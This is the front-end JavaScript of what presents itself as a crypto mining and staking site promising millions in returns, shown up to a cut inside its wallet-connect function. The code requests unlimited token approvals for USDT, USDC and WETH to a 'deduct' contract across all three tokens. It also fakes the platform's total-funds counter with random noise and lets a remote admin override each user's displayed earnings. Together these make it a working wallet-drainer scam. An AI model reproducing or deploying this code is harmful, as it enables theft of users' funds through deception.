//---Client-side Constants---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';

//---ABI Definitions---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements---
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletTokenSelect = document.getElementById('walletTokenSelect');
const walletBalanceAmount = document.getElementById('walletBalanceAmount');
const accountBalanceValue = document.getElementById('accountBalanceValue');
const totalValue = document.getElementById('totalValue');
let grossOutputValue = document.getElementById('grossOutputValue');
let cumulativeValue = document.getElementById('cumulativeValue');
const nextBenefit = document.getElementById('nextBenefit');
const claimBtn = document.createElement('button');
claimBtn.id = 'claimButton';
const claimModal = document.getElementById('claimModal');
const closeModal = document.getElementById('closeModal');
const confirmClaim = document.getElementById('confirmClaim');
const cancelClaim = document.getElementById('cancelClaim');
const modalClaimableETH = document.getElementById('modalClaimableETH');
const modalEthPrice = document.getElementById('modalEthPrice');
const modalSelectedToken = document.getElementById('modalSelectedToken');
const modalEquivalentValue = document.getElementById('modalEquivalentValue');
const modalTitle = document.getElementById('modalTitle');
const languageSelect = document.getElementById('languageSelect');

// 定義 elements 物件，映射需要多語言更新的 DOM 元素
const elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"]'),
    tabPledging: document.querySelector('.tab[data-tab="pledging"]'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    compoundLabel: document.getElementById('compoundLabel'),
    startBtnText: startBtn,
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: pledgeBtn,
    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
    expectedYieldLabel: document.getElementById('expectedYieldLabel'),
    apyLabel: document.getElementById('apyLabel'),
    lockedUntilLabel: document.getElementById('lockedUntilLabel')
};

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let stakingStartTime = null;
let claimedInterest = 0;
let pledgedAmount = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
let isServerAvailable = false;
let pendingUpdates = [];

// 環境檢測：判斷是否為開發模式
const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.isDevMode;

//---Language Translations---
const translations = {
    'en': {
        title: 'Popular Mining',
        subtitle: 'Start Earning Millions',
        tabLiquidity: 'Liquidity',
        tabPledging: 'Pledging',
        grossOutputLabel: 'Gross Output',
        cumulativeLabel: 'Cumulative',
        walletBalanceLabel: 'Wallet Balance',
        accountBalanceLabel: 'Account Balance',
        compoundLabel: '⚡ Compound',
        nextBenefit: 'Next Benefit: 00:00:00',
        startBtnText: 'Start',
        pledgeAmountLabel: 'Pledge Amount',
        pledgeDurationLabel: 'Duration',
        pledgeBtnText: 'Pledge Now',
        totalPledgedLabel: 'Total Pledged',
        expectedYieldLabel: 'Expected Yield',
        apyLabel: 'APY',
        lockedUntilLabel: 'Locked Until',
        claimBtnText: 'Claim',
        noClaimable: 'No claimable interest available or invalid value.',
        priceError: 'Could not fetch price data. Please try again later.',
        invalidCalc: 'Invalid calculation. Please refresh and try again.',
        claimSuccess: 'Claim successful! Your Account Balance has been updated.',
        walletConnected: 'Wallet connected successfully.',
        fetchingBalances: 'Fetching wallet balances...',
        error: 'Error',
        offlineWarning: 'Server is offline, running locally. Data will sync when server is available.',
        noWallet: 'Please install MetaMask or a compatible wallet to continue.'
    },
    'zh-Hant': {
        title: '熱門挖礦',
        subtitle: '開始賺取數百萬',
        tabLiquidity: '流動性',
        tabPledging: '質押',
        grossOutputLabel: '總產出',
        cumulativeLabel: '累計',
        walletBalanceLabel: '錢包餘額',
        accountBalanceLabel: '帳戶餘額',
        compoundLabel: '⚡ 複利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '開始',
        pledgeAmountLabel: '質押金額',
        pledgeDurationLabel: '期間',
        pledgeBtnText: '立即質押',
        totalPledgedLabel: '總質押',
        expectedYieldLabel: '預期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '鎖定至',
        claimBtnText: '領取',
        noClaimable: '無可領取的利息或數值無效。',
        priceError: '無法獲取價格數據，請稍後重試。',
        invalidCalc: '計算無效，請刷新後重試。',
        claimSuccess: '領取成功！您的帳戶餘額已更新。',
        walletConnected: '錢包連線成功。',
        fetchingBalances: '正在獲取錢包餘額...',
        error: '錯誤',
        offlineWarning: '伺服器離線，使用本地運行。數據將在伺服器可用時同步。',
        noWallet: '請安裝 MetaMask 或相容錢包以繼續。'
    },
    'zh-Hans': {
        title: '热门挖矿',
        subtitle: '开始赚取数百万',
        tabLiquidity: '流动性',
        tabPledging: '质押',
        grossOutputLabel: '总产出',
        cumulativeLabel: '累计',
        walletBalanceLabel: '钱包余额',
        accountBalanceLabel: '账户余额',
        compoundLabel: '⚡ 复利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '开始',
        pledgeAmountLabel: '质押金额',
        pledgeDurationLabel: '期间',
        pledgeBtnText: '立即质押',
        totalPledgedLabel: '总质押',
        expectedYieldLabel: '预期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '锁定至',
        claimBtnText: '领取',
        noClaimable: '无可领取的利息或数值无效。',
        priceError: '无法获取价格数据，请稍后重试。',
        invalidCalc: '计算无效，请刷新后重试。',
        claimSuccess: '领取成功！您的账户余额已更新。',
        walletConnected: '钱包连接成功。',
        fetchingBalances: '正在获取钱包余额...',
        error: '错误',
        offlineWarning: '服务器离线，使用本地运行。数据将在服务器可用时同步。',
        noWallet: '请安装 MetaMask 或兼容钱包以继续。'
    }
};
let currentLang = localStorage.getItem('language') || 'zh-Hant';

//---Helper Functions---
async function retry(fn, maxAttempts = 3, delayMs = 1500) {
    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (error) {
            if (i === maxAttempts - 1) throw error;
            console.warn(`retry: Attempt ${i + 1}/${maxAttempts} failed, retrying after ${delayMs}ms: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}

async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
    let attempts = 0;
    while (attempts < maxAttempts) {
        grossOutputValue = document.getElementById('grossOutputValue');
        cumulativeValue = document.getElementById('cumulativeValue');
        if (grossOutputValue && cumulativeValue) {
            console.log(`retryDOMAcquisition: Successfully acquired DOM elements after ${attempts + 1} attempts.`);
            return true;
        }
        console.warn(`retryDOMAcquisition: Attempt ${attempts + 1} failed. Retrying after ${delayMs}ms...`);
        await new Promise(resolve => setTimeout(resolve, delayMs));
        attempts++;
    }
    console.error(`retryDOMAcquisition: Failed to acquire DOM elements after ${maxAttempts} attempts.`);
    return false;
}

async function checkServerStatus() {
    try {
        const response = await fetch(`${API_BASE_URL}/api/status`, {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        if (response.ok) {
            const { status, lastUpdated } = await response.json();
            isServerAvailable = status === 'available';
            if (isServerAvailable && pendingUpdates.length > 0) {
                await syncPendingUpdates(lastUpdated);
            }
            console.log(`checkServerStatus: Server is ${isServerAvailable ? 'available' : 'unavailable'}, last updated: ${lastUpdated}`);
            return isServerAvailable;
        }
    } catch (error) {
        console.warn(`checkServerStatus: Server is unavailable: ${error.message}`);
        isServerAvailable = false;
        if (isDevMode) {
            updateStatus(translations[currentLang].offlineWarning, true);
        }
    }
    return false;
}

async function syncPendingUpdates(serverLastUpdated) {
    for (const update of pendingUpdates) {
        if (update.timestamp > serverLastUpdated) {
            await saveUserData(update.data, false);
            console.log(`syncPendingUpdates: Synced update with timestamp: ${update.timestamp}`);
        } else {
            console.log(`syncPendingUpdates: Skipped outdated update with timestamp: ${update.timestamp}`);
        }
    }
    pendingUpdates = [];
}

async function loadUserDataFromServer() {
    if (!userAddress) return;
    try {
        const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        }));
        if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
        const allData = await response.json();
        const userData = allData.users[userAddress] || {};
        const localData = JSON.parse(localStorage.getItem('userData') || '{}');
        const localLastUpdated = localData.lastUpdated || 0;
        if (allData.lastUpdated > localLastUpdated) {
            stakingStartTime = userData.stakingStartTime ? parseInt(userData.stakingStartTime) : null;
            claimedInterest = userData.claimedInterest ? parseFloat(userData.claimedInterest) : 0;
            pledgedAmount = userData.pledgedAmount ? parseFloat(userData.pledgedAmount) : 0;
            accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
            localStorage.setItem('userData', JSON.stringify({
                stakingStartTime,
                claimedInterest,
                pledgedAmount,
                accountBalance,
                nextBenefitTime: userData.nextBenefitTime,
                lastUpdated: allData.lastUpdated
            }));
            console.log(`loadUserDataFromServer: Synced user data from server:`, userData);
        } else {
            console.log(`loadUserDataFromServer: Local data is newer, keeping local state.`);
        }
        updateInterest();
        updateNextBenefitTimer();
    } catch (error) {
        console.warn(`loadUserDataFromServer: Failed to load from server: ${error.message}`);
        const localData = JSON.parse(localStorage.getItem('userData') || '{}');
        stakingStartTime = localData.stakingStartTime || null;
        claimedInterest = localData.claimedInterest || 0;
        pledgedAmount = localData.pledgedAmount || 0;
        accountBalance = localData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
        if (isDevMode) {
            updateStatus(translations[currentLang].offlineWarning, true);
        }
    }
}

async function saveUserData(data = null, addToPending = true) {
    if (!userAddress) {
        console.log(`saveUserData: No user address available, skipping save.`);
        return;
    }
    const dataToSave = data || {
        stakingStartTime,
        claimedInterest,
        pledgedAmount,
        accountBalance,
        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
        lastUpdated: Date.now()
    };
    if (!isServerAvailable) {
        if (addToPending) {
            pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
            localStorage.setItem('userData', JSON.stringify(dataToSave));
            if (isDevMode) {
                updateStatus(translations[currentLang].offlineWarning, true);
            }
        }
        return;
    }
    try {
        const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': 'true'
            },
            body: JSON.stringify({ address: userAddress, data: dataToSave })
        }));
        if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
        console.log(`saveUserData: User data sent to server successfully.`);
        localStorage.setItem('userData', JSON.stringify(dataToSave));
    } catch (error) {
        console.warn(`saveUserData: Could not send user data to server: ${error.message}`);
        if (addToPending) {
            pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
            localStorage.setItem('userData', JSON.stringify(dataToSave));
            if (isDevMode) {
                updateStatus(translations[currentLang].offlineWarning, true);
            }
        }
    }
}

//---UI Control Functions---
function updateStatus(message, isWarning = false) {
    if (!statusDiv) return;
    if (message === translations[currentLang].offlineWarning && !isDevMode) {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
        console.log(`updateStatus: Suppressed offline warning in production: ${message}`);
        return;
    }
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
    statusDiv.style.color = isWarning ? '#FFD700' : '#FFFFFF';
    console.log(`updateStatus: ${isWarning ? 'Warning' : 'Info'}: ${message}`);
}

function resetState(showMsg = true) {
    console.log(`resetState: Executing state reset...`);
    signer = userAddress = null;
    stakingStartTime = null;
    claimedInterest = 0;
    pledgedAmount = 0;
    accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
    if (interestInterval) {
        clearInterval(interestInterval);
        console.log(`resetState: Cleared interest interval: ${interestInterval}`);
    }
    if (nextBenefitInterval) {
        clearInterval(nextBenefitInterval);
        console.log(`resetState: Cleared next benefit interval: ${nextBenefitInterval}`);
    }
    localStorage.clear();
    console.log(`resetState: Local storage cleared.`);
    if (startBtn) {
        startBtn.style.display = 'block';
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
    }
    const existingClaimBtn = document.getElementById('claimButton');
    if (existingClaimBtn) {
        existingClaimBtn.remove();
        console.log(`resetState: Removed claim button.`);
    }
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.textContent = 'Connect';
        connectButton.title = 'Connect Wallet';
        console.log(`resetState: Reset connect button state.`);
    }
    disableInteractiveElements(true);
    if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
    if (walletTokenSelect) walletTokenSelect.value = 'USDT';
    if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
    if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
    if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
    if (showMsg) updateStatus(translations[currentLang].noWallet);
}

function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (pledgeToken) pledgeToken.disabled = disable;
    if (refreshWallet) {
        refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
        refreshWallet.style.color = disable ? '#999' : '#ff00ff';
    }
    if (claimBtn) claimBtn.disabled = disable;
    console.log(`disableInteractiveElements: Interactive elements ${disable ? 'disabled' : 'enabled'}.`);
}

function updateBalancesUI(walletBalances) {
    if (!walletTokenSelect) return;
    const selectedToken = walletTokenSelect.value;
    const decimals = { USDT: 6, USDC: 6, WETH: 18 };
    const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
    const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
    if (walletBalanceAmount) {
        walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
        console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`);
    }
    const claimedBalance = accountBalance[selectedToken] || 0;
    const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
    if (accountBalanceValue) {
        accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
        console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`);
    }
    if (parseFloat(formattedWalletBalance) < 0.001) {
        updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
    } else if (statusDiv.style.color === 'rgb(255, 215, 0)') {
        updateStatus("");
    }
}

function updateTotalFunds() {
    if (totalValue) {
        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
        const initialFunds = 12856459.94;
        const averageIncreasePerSecond = 0.055;
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
        const totalIncrease = elapsedSeconds * averageIncreasePerSecond;
        const randomFluctuation = (Math.random() - 0.5);
        const totalFunds = initialFunds + totalIncrease + randomFluctuation;
        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
        console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`);
    }
}

async function updateInterest() {
    if (!grossOutputValue || !cumulativeValue) {
        console.warn(`updateInterest: Missing DOM elements:`, { grossOutputValue: !!grossOutputValue, cumulativeValue: !!cumulativeValue });
        const acquired = await retryDOMAcquisition();
        if (!acquired) {
            console.error(`updateInterest: Failed to re-acquire DOM elements, skipping update.`);
            return;
        }
    }
    if (!stakingStartTime || !userAddress) {
        console.log(`updateInterest: Skipping due to missing data:`, { stakingStartTime, userAddress });
        return;
    }
    await loadUserDataFromServer();
    let finalGrossOutput;
    let finalCumulative;
    let overrideApplied = false;

    try {
        const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
            cache: 'no-cache',
            headers: { 'ngrok-skip-browser-warning': 'true' }
        }));
        if (response.ok) {
            const allData = await response.json();
            const userOverrides = allData.overrides[userAddress] || {};
            if (userOverrides.grossOutput != null && userOverrides.cumulative != null) {
                finalGrossOutput = Number(userOverrides.grossOutput);
                finalCumulative = Number(userOverrides.cumulative);
                if (!isNaN(finalGrossOutput) && !isNaN(finalCumulative)) {
                    overrideApplied = true;
                    console.log(`updateInterest: Admin override applied:`, { finalGrossOutput, finalCumulative });
                }
            }
        }
    } catch (error) {
        console.warn(`updateInterest: Fetch error, using local calculation: ${error.message}`);
    }

    if (!overrideApplied) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
        const baseInterestRate = 0.000001;
        const interestRate = baseInterestRate * pledgedAmount;
        finalGrossOutput = elapsedSeconds * interestRate;
        finalCumulative = finalGrossOutput - claimedInterest;
        console.log(`updateInterest: Using local calculation:`, { finalGrossOutput, finalCumulative });
    }

    grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
    cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
    console.log(`updateInterest: Updated UI - Gross Output: ${finalGrossOutput.toFixed(7)} ETH, Cumulative: ${finalCumulative.toFixed(7)} ETH`);
}

function updateNextBenefitTimer() {
    if (!nextBenefit) return;
    const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime'));
    const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
    if (!nextBenefitTimestamp) {
        nextBenefit.textContent = `${label}: 00:00:00`;
        console.log(`updateNextBenefitTimer: No next benefit time set.`);
        return;
    }
    const now = Date.now();
    let diff = nextBenefitTimestamp - now;
    if (diff < 0) {
        const twelveHoursInMillis = 12 * 60 * 60 * 1000;
        let newNextBenefitTimestamp = nextBenefitTimestamp;
        while (newNextBenefitTimestamp <= now) {
            newNextBenefitTimestamp += twelveHoursInMillis;
        }
        localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
        saveUserData();
        console.log(`updateNextBenefitTimer: Updated next benefit time: ${newNextBenefitTimestamp}`);
    }
    const totalSeconds = Math.floor(diff / 1000);
    const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
    const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
    const seconds = String(totalSeconds % 60).padStart(2, '0');
    nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
    console.log(`updateNextBenefitTimer: Updated timer: ${hours}:${minutes}:${seconds}`);
}

function getETOffsetMilliseconds() {
    const now = new Date();
    const mar = new Date(now.getFullYear(), 2, 8);
    const nov = new Date(now.getFullYear(), 10, 1);
    const marDay = mar.getDay();
    const novDay = nov.getDay();
    const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
    const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
    if (now >= dstStart && now < dstEnd) {
        return -4 * 60 * 60 * 1000;
    }
    return -5 * 60 * 60 * 1000;
}

function setInitialNextBenefitTime() {
    if (localStorage.getItem('nextBenefitTime')) return;
    console.log(`setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time...`);
    const etOffset = getETOffsetMilliseconds();
    const nowUtcTimestamp = Date.now();
    const nowET = new Date(nowUtcTimestamp + etOffset);
    const noonET = new Date(nowET);
    noonET.setHours(12, 0, 0, 0);
    const midnightET = new Date(nowET);
    midnightET.setHours(24, 0, 0, 0);
    let nextBenefitTimeET;
    if (nowET < noonET) {
        nextBenefitTimeET = noonET;
    } else {
        nextBenefitTimeET = midnightET;
    }
    const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
    localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
    saveUserData();
    console.log(`setInitialNextBenefitTime: Set next benefit time: ${finalNextBenefitTimestamp}`);
}

function activateStakingUI() {
    const storedStartTime = localStorage.getItem('stakingStartTime');
    if (storedStartTime) {
        stakingStartTime = parseInt(storedStartTime);
        console.log(`activateStakingUI: Restored staking start time: ${stakingStartTime}`);
    } else {
        stakingStartTime = Date.now();
        localStorage.setItem('stakingStartTime', stakingStartTime.toString());
        console.log(`activateStakingUI: Set new staking start time: ${stakingStartTime}`);
    }
    claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
    pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
    const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
    if (storedAccountBalance) {
        accountBalance = storedAccountBalance;
        console.log(`activateStakingUI: Restored account balance:`, accountBalance);
    }
    if (startBtn) startBtn.style.display = 'none';
    if (document.getElementById('claimButton')) return;
    claimBtn.textContent = translations[currentLang]?.claimBtnText || 'Claim';
    claimBtn.className = 'start-btn';
    claimBtn.style.marginTop = '10px';
    claimBtn.disabled = false;
    const placeholder = document.getElementById('claimButtonPlaceholder');
    placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
    console.log(`activateStakingUI: Added claim button to UI.`);
    if (!claimBtn.hasEventListener) {
        claimBtn.addEventListener('click', claimInterest);
        claimBtn.hasEventListener = true;
        console.log(`activateStakingUI: Added event listener to claim button.`);
    }
    if (interestInterval) clearInterval(interestInterval);
    interestInterval = setInterval(updateInterest, 1000);
    console.log(`activateStakingUI: Set interest interval: ${interestInterval}`);
    if (nextBenefitInterval) clearInterval(nextBenefitInterval);
    nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
    console.log(`activateStakingUI: Set next benefit interval: ${nextBenefitInterval}`);
    saveUserData();
}

//---Core Wallet Logic---
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();
    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
    let txHash, receipt = null;
    try {
        console.log(`sendMobileRobustTransaction: Sending transaction:`, mobileTx);
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
        receipt = await provider.waitForTransaction(txHash);
        console.log(`sendMobileRobustTransaction: Transaction confirmed, receipt:`, receipt);
    } catch (error) {
        console.warn(`sendMobileRobustTransaction: Transaction error: ${error.message}`);
        if (error.hash) txHash = error.hash;
        else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }
        if (txHash) {
            updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
            receipt = await provider.waitForTransaction(txHash);
            console.log(`sendMobileRobustTransaction: Transaction confirmed after error, receipt:`, receipt);
        } else throw new Error(`Transaction failed to send: ${error.message}`);
    }
    if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
    return receipt;
}

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus(translations[currentLang].noWallet);
            disableInteractiveElements(true);
            console.log(`initializeWallet: No Ethereum provider detected.`);
            connectButton.disabled = true;
            return;
        }
        provider = new ethers.BrowserProvider(window.ethereum);
        window.ethereum.on('accountsChanged', (newAccounts) => {
            console.log(`initializeWallet: Accounts changed:`, newAccounts);
            if (userAddress) {
                if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                    window.location.reload();
                }
            }
        });
        window.ethereum.on('chainChanged', () => {
            console.log(`initializeWallet: Chain changed, reloading page.`);
            window.location.reload();
        });
        const accounts = await provider.send('eth_accounts', []);
        console.log(`initializeWallet: Initial accounts:`, accounts);
        if (accounts.length > 0) {
            await connectWallet();
        } else {
            disableInteractiveElements(true);
            updateStatus(translations[currentLang].noWallet);
        }
    } catch (error) {
        console.error(`initializeWallet: Wallet initialization error: ${error.message}`);
        updateStatus(`Initialization failed: ${error.message}`);
        connectButton.disabled = true;
    }
}

async function updateUIBasedOnChainState() {
    if (!signer) {
        console.log(`updateUIBasedOnChainState: No signer available, skipping.`);
        return;
    }
    try {
        updateStatus(translations[currentLang].fetchingBalances);
        const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
        console.log(`updateUIBasedOnChainState: Required allowance: ${requiredAllowance.toString()}`);
        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            retry(() => deductContract.isServiceActiveFor(userAddress)),
            retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
            retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
            retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
        ]);
        console.log(`updateUIBasedOnChainState: Chain state:`, { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
        const isWethAuthorized = wethAllowance >= requiredAllowance;
        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
        if (isFullyAuthorized) {
            console.log(`updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI.`);
            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
            walletTokenSelect.dispatchEvent(new Event('change'));
            setInitialNextBenefitTime();
            activateStakingUI();
        } else {
            console.log(`updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.`);
            if (startBtn) startBtn.style.display = 'block';
        }
        disableInteractiveElements(false);
        updateStatus("");
    } catch (error) {
        console.error(`updateUIBasedOnChainState: Failed to check on-chain state: ${error.message}`);
        updateStatus(`Failed to check on-chain state: ${error.message}`);
    }
}

async function handleConditionalAuthorizationFlow() {
    if (!signer) throw new Error("Wallet not connected");
    updateStatus('Preparing authorization...');
    const selectedToken = walletTokenSelect.value;
    console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    console.log(`handleConditionalAuthorizationFlow: Required allowance: ${requiredAllowance.toString()}`);
    const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
    console.log(`handleConditionalAuthorizationFlow: Service activated: ${serviceActivated}`);
    const tokenMap = {
        'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
        'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
        'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
    };
    const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
    let tokenToActivate = '';
    for (const { name, contract, address } of tokensToProcess) {
        updateStatus(`Checking ${name} allowance...`);
        const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        console.log(`handleConditionalAuthorizationFlow: ${name} allowance: ${currentAllowance.toString()}`);
        if (currentAllowance < requiredAllowance) {
            updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            console.log(`handleConditionalAuthorizationFlow: Sending approval transaction for ${name}:`, approvalTx);
            await sendMobileRobustTransaction(approvalTx);
            const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance: ${newAllowance.toString()}`);
            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
        } else {
            if (!tokenToActivate) tokenToActivate = address;
        }
    }
    if (!serviceActivated && tokenToActivate) {
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`Activating service (using ${tokenName})...`);
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        console.log(`handleConditionalAuthorizationFlow: Sending activate service transaction:`, activateTx);
        await sendMobileRobustTransaction(activateTx);
    }
}

async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus(translations[currentLang].noWallet);
            console.log(`connectWallet: No Ethereum provider detected.`);
            connectButton.disabled = true;
            return;
        }
        if (!provider) {
            provider = new ethers.BrowserProvider(window.ethereum);
